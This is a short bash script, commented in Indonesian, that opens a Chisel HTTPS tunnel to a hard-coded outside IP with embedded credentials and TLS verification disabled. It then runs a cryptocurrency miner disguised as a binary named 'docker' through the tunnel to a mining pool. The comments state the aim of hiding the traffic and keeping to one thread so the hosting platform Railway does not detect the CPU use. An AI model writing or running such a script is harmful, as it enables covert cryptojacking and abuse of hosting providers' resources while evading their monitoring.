#!/bin/bash

# --- KONFIGURASI ---
IP_UBUNTU="45.115.224.184"

echo "Membuka The Ghost Tunnel (Chisel HTTPS)..."

# Menjalankan Chisel Client
# --tls-skip-verify sangat penting agar tidak error TLS Handshake
./chisel client --tls-skip-verify --auth "mineruser:minerpass123" https://$IP_UBUNTU:443 4629:dagnam.xyz:4629 &

# Tunggu terowongan stabil
sleep 10

echo "Menjalankan Miner via Ghost Tunnel..."

# Jalankan binary miner kamu
# -t 1 disarankan agar tidak memicu deteksi CPU Railway
./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1
